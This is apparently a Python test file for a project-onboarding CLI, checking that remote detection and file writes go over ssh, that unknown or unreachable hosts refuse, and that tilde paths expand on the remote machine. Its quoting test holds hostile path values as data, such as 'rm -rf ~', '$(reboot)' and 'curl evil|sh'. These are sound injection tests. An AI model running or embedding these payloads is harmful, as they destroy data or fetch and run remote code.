"""#583 — `onboard-project --host <remote>` must run EVERY detect + act step
over ssh on the target, never locally.

Live incident (2026-08-19): `onboard-project "~/devel/montalu/automatizacie-
montalu" --host dev2 --dry-run` reported EVERY step `would-apply` — detection
ran LOCALLY on dev1 (where the path does not exist) instead of over ssh on
dev2, and the tilde never expanded remotely. A real run would have produced a
local junk dir + a NEW colliding GH repo `montalu-automatizacie-montalu` (the
name was ALSO wrongly doubled). This file pins the CORRECT behavior and FAILS
against the pre-fix code.

OFFLINE: no real ssh/network is EVER touched — a `RemoteRunner` fixture models
a healthy (or unreachable) remote box; local sub-calls (registry) run for real.
"""

import os
import shlex
import subprocess
import sys
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import cli_onboard as ob

CP = subprocess.CompletedProcess
REMOTE_URL = "https://github.com/zbynekdrlik/foo583.git"
# dev2 is a real REMOTE_HOSTS entry, so resolve_remote("dev2") ssh-wraps.
REMOTE_HOST = "dev2"


class RemoteRunner:
    """Injected runner modeling a remote box reached over ssh. `gh` is
    intercepted (never a real ticket); `ssh` is answered from a fixture model;
    any LOCAL command (host=None) runs for real. Flags model the remote repo
    state so the same fixture can prove detection went remote AND that writes
    go over ssh (never to the local filesystem)."""

    def __init__(self, reachable=True, claude_present=True,
                 gitignore_present=True, has_ci=True, home="/home/newlevel",
                 gitignore_content=None):
        self.calls = []
        self.ssh_calls = []
        self.gh_calls = []
        self.writes = []            # remote `sh -c 'cat > PATH'` targets seen
        self.reachable = reachable
        self.claude_present = claude_present
        self.gitignore_present = gitignore_present
        self.has_ci = has_ci
        self.home = home
        self.gitignore_content = gitignore_content

    # -- introspection helpers for assertions -----------------------------
    def ssh_cmd_strings(self):
        """The remote command string of every ssh call (last argv element)."""
        return [c[-1] for c in self.ssh_calls if c]

    # -- runner protocol --------------------------------------------------
    def __call__(self, argv, **kw):
        self.calls.append(list(argv))
        head = argv[0] if argv else ""
        if head == "gh":
            self.gh_calls.append(list(argv))
            return CP(argv, 0, "[]", "")
        if head == "ssh":
            self.ssh_calls.append(list(argv))
            return self._answer_ssh(argv, kw.get("input"))
        # local test/cat/sh/find/git — run for real against the fixture
        return subprocess.run(argv, **kw)

    def _answer_ssh(self, argv, stdin=None):
        try:
            cmd = shlex.split(argv[-1])
        except ValueError:
            cmd = [argv[-1]]
        if not self.reachable:
            return CP(cmd, 255, "", "ssh: connect to host: Connection refused")
        if not cmd:
            return CP(cmd, 0, "", "")
        head = cmd[0]
        if head == "true":
            return CP(cmd, 0, "", "")
        if head == "printf":
            return CP(cmd, 0, self.home, "")
        if head == "test":
            return self._test(cmd)
        if head == "cat":
            path = cmd[-1]
            if path.endswith("CLAUDE.md"):
                if not self.claude_present:
                    return CP(cmd, 1, "", "cat: No such file or directory")
                # a healthy CLAUDE.md carries the Playbook router (no drift)
                return CP(cmd, 0, "# proj\n\n## Playbook router\n- x\n", "")
            if not self.gitignore_present:
                return CP(cmd, 1, "", "cat: No such file or directory")
            content = self.gitignore_content
            if content is None:
                content = "\n".join(ob.GITIGNORE_COMMON) + "\n"
            return CP(cmd, 0, content, "")
        if head == "sh" and len(cmd) >= 3 and cmd[1] == "-c" \
                and cmd[2].startswith("cat >"):
            self.writes.append((cmd[2], stdin))   # (target-cmd, piped content)
            return CP(cmd, 0, "", "")
        if head == "find":
            return CP(cmd, 0, "ci.yml\n" if self.has_ci else "", "")
        if head == "git":
            return self._git(cmd)
        return CP(cmd, 0, "", "")

    def _test(self, cmd):
        path = cmd[-1]
        if path.endswith("CLAUDE.md"):
            return CP(cmd, 0 if self.claude_present else 1, "", "")
        if any(path.endswith(x) for x in ("Cargo.toml", "package.json",
                                          "setup.py", "requirements.txt")):
            return CP(cmd, 1, "", "")           # not rust/node
        return CP(cmd, 0, "", "")               # pyproject.toml, dirs, etc. exist

    def _git(self, cmd):
        s = " ".join(cmd)
        if "rev-parse --git-dir" in s:
            return CP(cmd, 0, ".git\n", "")
        if "remote get-url origin" in s:
            return CP(cmd, 0, REMOTE_URL + "\n", "")
        if "symbolic-ref --short refs/remotes/origin/HEAD" in s:
            return CP(cmd, 0, "origin/main\n", "")
        if "rev-parse --verify --quiet refs/heads/" in s:
            return CP(cmd, 0, "abc123\n", "")   # work branch present
        if "symbolic-ref --short HEAD" in s:
            return CP(cmd, 0, "dev\n", "")
        if "ls-files" in s or "diff --cached" in s or "status --porcelain" in s:
            return CP(cmd, 0, "", "")           # clean, no tracked artifacts
        return CP(cmd, 0, "", "")               # add/commit/rm/init/branch ok


# --------------------------------------------------------------------------- #
# 1) Name derivation — collapse the cluster prefix when the leaf carries it.
# --------------------------------------------------------------------------- #
class TestClusterPrefixCollapse(unittest.TestCase):
    def test_leaf_already_carries_cluster_name_is_not_doubled(self):
        self.assertEqual(
            ob.derive_repo_name("/home/x/devel/montalu/automatizacie-montalu"),
            "automatizacie-montalu")

    def test_case_insensitive_collapse(self):
        self.assertEqual(
            ob.derive_repo_name("/home/x/devel/montalu/Automatizacie-Montalu"),
            "automatizacie-montalu")

    def test_leaf_without_cluster_token_still_prefixed(self):
        # the collapse must NOT swallow the legitimate prefix cases
        self.assertEqual(ob.derive_repo_name("/home/x/devel/montalu/n8n"),
                         "montalu-n8n")
        self.assertEqual(ob.derive_repo_name("/home/x/devel/montalu/vyuctovanie"),
                         "montalu-vyuctovanie")

    def test_leaf_starting_with_cluster_token_not_doubled(self):
        self.assertEqual(
            ob.derive_repo_name("/home/x/devel/montalu/montalu-vyuctovanie"),
            "montalu-vyuctovanie")


# --------------------------------------------------------------------------- #
# 2) Remote detection runs over ssh — a healthy remote repo is `satisfied`,
#    never `would-apply` (the incident's false report).
# --------------------------------------------------------------------------- #
class TestRemoteDetectionOverSsh(unittest.TestCase):
    def test_healthy_remote_repo_all_satisfied_dry_run(self):
        with TemporaryDirectory() as rd:
            # a path that does NOT exist locally — proves detection is remote
            local_missing = "/nonexistent-583-remote-only/proj"
            run = RemoteRunner()
            r = ob.onboard_project(local_missing, host=REMOTE_HOST, name="foo583",
                                   registry_path=str(Path(rd) / "r.json"),
                                   run=run, dry_run=True)
            self.assertIsNone(r.get("error"), r.get("error"))
            st = {s["step"]: s["status"] for s in r["steps"]}
            for step in ("git_init", "remote", "branches", "gitignore",
                         "claude_md"):
                self.assertEqual(st[step], "satisfied",
                                 "%s ran locally (false %s), not over ssh"
                                 % (step, st[step]))
            # detection genuinely went over ssh
            self.assertTrue(run.ssh_calls, "no ssh call — detection ran locally")
            # nothing local was created for a remote path
            self.assertFalse(os.path.exists(local_missing))


# --------------------------------------------------------------------------- #
# 3) No local writes for a remote host — gitignore/CLAUDE.md go over ssh.
# --------------------------------------------------------------------------- #
class TestNoLocalWritesForRemote(unittest.TestCase):
    def test_writes_go_over_ssh_never_to_local_fs(self):
        with TemporaryDirectory() as d, TemporaryDirectory() as rd:
            localdir = Path(d) / "proj583"
            localdir.mkdir()                      # exists locally + empty
            run = RemoteRunner(claude_present=False, gitignore_present=False)
            r = ob.onboard_project(str(localdir), host=REMOTE_HOST, name="foo583",
                                   registry_path=str(Path(rd) / "r.json"),
                                   run=run, dry_run=False)
            self.assertIsNone(r.get("error"), r.get("error"))
            st = {s["step"]: s["status"] for s in r["steps"]}
            self.assertEqual(st["claude_md"], "applied")
            self.assertEqual(st["gitignore"], "applied")
            # NOTHING written to the local filesystem
            self.assertFalse((localdir / "CLAUDE.md").exists(),
                             "CLAUDE.md written LOCALLY for a remote host")
            self.assertFalse((localdir / ".gitignore").exists(),
                             ".gitignore written LOCALLY for a remote host")
            # the writes went over ssh, and carried the right CONTENT (not just
            # the right target) — proves the piped body, not only the path.
            cm_writes = [c for (t, c) in run.writes if "CLAUDE.md" in t]
            gi_writes = [c for (t, c) in run.writes if ".gitignore" in t]
            self.assertTrue(cm_writes, "no remote CLAUDE.md write recorded")
            self.assertTrue(gi_writes, "no remote .gitignore write recorded")
            self.assertIn("## Playbook router", cm_writes[-1],
                          "remote CLAUDE.md write had wrong content")
            self.assertIn("__pycache__/", gi_writes[-1],
                          "remote .gitignore write had wrong content")


# --------------------------------------------------------------------------- #
# 4) Fail-safe — an unreachable remote REFUSES the real run (never proceeds on
#    local false-negatives), and dry-run surfaces the error too.
# --------------------------------------------------------------------------- #
class TestUnreachableRemoteRefuses(unittest.TestCase):
    def test_real_run_refuses_on_unreachable_host(self):
        with TemporaryDirectory() as rd:
            run = RemoteRunner(reachable=False)
            r = ob.onboard_project("/home/x/devel/foo583", host=REMOTE_HOST,
                                   name="foo583",
                                   registry_path=str(Path(rd) / "r.json"),
                                   run=run, dry_run=False)
            self.assertTrue(r.get("error"),
                            "unreachable host did NOT refuse — proceeded on "
                            "local false-negatives")
            self.assertEqual(r["steps"], [], "steps ran despite unreachable host")
            # no repo/ticket created anywhere
            self.assertEqual([c for c in run.gh_calls if "create" in c], [])

    def test_dry_run_surfaces_the_error(self):
        with TemporaryDirectory() as rd:
            run = RemoteRunner(reachable=False)
            r = ob.onboard_project("/home/x/devel/foo583", host=REMOTE_HOST,
                                   name="foo583",
                                   registry_path=str(Path(rd) / "r.json"),
                                   run=run, dry_run=True)
            self.assertTrue(r.get("error"),
                            "dry-run hid the unreachable-host error")


# --------------------------------------------------------------------------- #
# 5) Tilde expands REMOTELY (quoting) — the ssh git commands carry the
#    remote-home-expanded absolute path, never a literal `~`.
# --------------------------------------------------------------------------- #
class TestRemoteTildeExpansion(unittest.TestCase):
    def test_tilde_expands_against_remote_home(self):
        with TemporaryDirectory() as rd:
            run = RemoteRunner(home="/remote/home583")
            ob.onboard_project("~/devel/foo583", host=REMOTE_HOST, name="foo583",
                               registry_path=str(Path(rd) / "r.json"),
                               run=run, dry_run=True)
            joined = " || ".join(run.ssh_cmd_strings())
            self.assertIn("/remote/home583/devel/foo583", joined,
                          "path was not expanded against the REMOTE home")
            # never a literal unexpanded tilde path in a remote git command
            for s in run.ssh_cmd_strings():
                if s.startswith("git "):
                    self.assertNotIn("~/devel/foo583", s,
                                     "literal ~ leaked into a remote git command")


# --------------------------------------------------------------------------- #
# 6) --audit uses the same remote ssh path — healthy remote audits clean, an
#    unreachable host audits as `unreachable` (never as drift).
# --------------------------------------------------------------------------- #
class TestAuditRemote(unittest.TestCase):
    def _entry(self, path, host):
        return {"name": "foo583", "host": host, "path": path,
                "branch_model": "2-branch", "default_branch": "main",
                "work_branch": "dev"}

    def test_healthy_remote_audits_clean(self):
        run = RemoteRunner()
        drift = ob.audit_project(self._entry("/home/x/devel/foo583", REMOTE_HOST),
                                 host=REMOTE_HOST, run=run)
        self.assertEqual(drift, [], "healthy remote project reported drift: %r"
                         % drift)
        self.assertTrue(run.ssh_calls, "audit ran locally, not over ssh")

    def test_unreachable_remote_audits_as_unreachable_not_drift(self):
        run = RemoteRunner(reachable=False)
        drift = ob.audit_project(self._entry("/home/x/devel/foo583", REMOTE_HOST),
                                 host=REMOTE_HOST, run=run)
        kinds = {d["kind"] for d in drift}
        self.assertIn("unreachable", kinds)
        self.assertNotIn("missing-repo", kinds,
                         "unreachable host falsely reported as missing-repo drift")


# --------------------------------------------------------------------------- #
# 7) Review fix — a reachable REMOTE host whose project dir is GONE audits as
#    `missing-repo` drift (not a soft `unreachable`), matching the local signal.
# --------------------------------------------------------------------------- #
class TestAuditRemoteMissingDirIsDrift(unittest.TestCase):
    def test_reachable_host_missing_dir_is_missing_repo(self):
        class DirGone(RemoteRunner):
            def _test(self, cmd):
                # dir-existence probe (`test -d <target>`) fails; other tests
                # (Cargo/CLAUDE.md) behave normally.
                if cmd[1] == "-d":
                    return CP(cmd, 1, "", "")
                return RemoteRunner._test(self, cmd)
        run = DirGone()                       # host reachable, project dir absent
        drift = ob.audit_project(
            {"name": "foo583", "host": REMOTE_HOST, "path": "/home/x/devel/foo583",
             "branch_model": "2-branch", "default_branch": "main",
             "work_branch": "dev"}, host=REMOTE_HOST, run=run)
        kinds = {d["kind"] for d in drift}
        self.assertIn("missing-repo", kinds,
                      "a vanished remote project must be drift, not clean")
        self.assertNotIn("unreachable", kinds)


# --------------------------------------------------------------------------- #
# 8) Review fix (BLOCKER) — an UNKNOWN/typo `--host` REFUSES rather than
#    silently degrading to a LOCAL run (which re-opens the #583 junk outcome).
# --------------------------------------------------------------------------- #
class TestUnknownHostRefuses(unittest.TestCase):
    def test_typo_host_refuses_never_localizes(self):
        with TemporaryDirectory() as rd:
            run = RemoteRunner()
            # `dve2` is a one-char typo of `dev2` — NOT a REMOTE_HOSTS entry
            r = ob.onboard_project("~/devel/montalu/automatizacie-montalu",
                                   host="dve2", registry_path=str(Path(rd) / "r.json"),
                                   run=run, dry_run=False)
            self.assertTrue(r.get("error"),
                            "unknown host silently degraded to a LOCAL run")
            self.assertEqual(r["steps"], [])
            # no repo/ticket created for the (would-be doubled) name anywhere
            self.assertEqual([c for c in run.gh_calls if "create" in c], [])


# --------------------------------------------------------------------------- #
# 9) Review fix — a LOCAL onboard of a NONEXISTENT dir refuses too (onboard
#    operates on an EXISTING project directory, local and remote alike).
# --------------------------------------------------------------------------- #
class TestLocalNonexistentDirRefuses(unittest.TestCase):
    def test_local_missing_dir_refuses(self):
        with TemporaryDirectory() as rd:
            run = RemoteRunner()
            r = ob.onboard_project("/nonexistent-583-local/proj", host=None,
                                   registry_path=str(Path(rd) / "r.json"),
                                   run=run, dry_run=False)
            self.assertTrue(r.get("error"), "local nonexistent dir was onboarded")
            self.assertEqual(r["steps"], [])
            self.assertEqual([c for c in run.gh_calls if "create" in c], [])


# --------------------------------------------------------------------------- #
# 10) Review fix — a hostile project PATH cannot break out of the ssh quoting:
#     each metacharacter-laden path round-trips through a real /bin/sh re-parse
#     back to exactly one argument (never an executed command).
# --------------------------------------------------------------------------- #
class TestSshQuotingInjection(unittest.TestCase):
    def _remote_cmd(self, host, argv):
        """The reconstructed remote argv for _exec(argv, host) — mirrors the
        real ssh path: build the ssh command via a recording runner, then
        re-parse its command string the way the remote login shell would."""
        seen = {}

        def rec(a, **kw):
            seen["ssh"] = a
            return CP(a, 0, "", "")
        ob._exec(argv, host=host, run=rec)
        # argv[-1] is the single command string ssh sends; a real shell splits
        # it back — shlex.split is exactly that parse.
        return shlex.split(seen["ssh"][-1])

    def test_metachar_path_stays_one_argument(self):
        for hostile in ("foo; rm -rf ~", "$(reboot)", "a' ; rm -rf / ; '",
                        "foo && curl evil|sh", "back`touch x`tick"):
            argv = ["git", "-C", hostile, "rev-parse", "--git-dir"]
            got = self._remote_cmd(REMOTE_HOST, argv)
            # the hostile path is preserved verbatim as ONE argv element, and no
            # extra command tokens leaked in (argv length is exactly preserved).
            self.assertEqual(got, argv,
                             "hostile path %r broke out of ssh quoting" % hostile)

    def test_write_path_content_never_on_command_line(self):
        # _write_file must carry content via stdin, never interpolated into the
        # command — a hostile path is still just one quoted redirect target.
        seen = {}

        def rec(a, **kw):
            seen["ssh"] = a
            seen["input"] = kw.get("input")
            return CP(a, 0, "", "")
        ob._write_file("/x/'; rm -rf ~ ;'/f", "SECRET-BODY", host=REMOTE_HOST,
                       run=rec)
        parsed = shlex.split(seen["ssh"][-1])       # sh -c "cat > '<path>'"
        self.assertEqual(parsed[:2], ["sh", "-c"])
        self.assertIn("cat >", parsed[2])
        self.assertNotIn("SECRET-BODY", " ".join(seen["ssh"]),
                         "content leaked onto the command line")
        self.assertEqual(seen["input"], "SECRET-BODY")


if __name__ == "__main__":
    unittest.main()
